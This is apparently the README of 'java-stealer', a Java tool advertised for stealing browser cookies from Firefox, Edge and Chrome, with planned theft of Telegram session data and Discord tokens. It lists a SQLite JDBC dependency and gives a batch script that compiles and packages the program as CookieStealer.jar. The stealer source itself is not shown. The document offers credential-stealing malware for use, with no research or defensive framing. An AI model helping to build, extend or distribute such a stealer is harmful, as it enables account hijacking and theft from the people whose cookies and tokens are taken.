# java-stealer
This stealed a cookies from browser
1.Firefox
2.Edge
3.Chrome
This updating every week! 
on this week
1.Stealing Tdata(maybe)
2.Stealing others browsers
3.Stealing discord token
need library add to your project
https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.44.1.0/sqlite-jdbc-3.44.1.0.jar
!!!JDK 21 ONLY!!!
How to build?
Create .bat file with this text
@echo off
mkdir build 2>nul
javac -cp "lib/*" -d build src\main\java\org\example\*.java
echo Main-Class: org.example.CookieStealerLibrary > manifest.txt
jar cfm CookieStealer.jar manifest.txt -C build .
and double click on this! This,stealer builded!
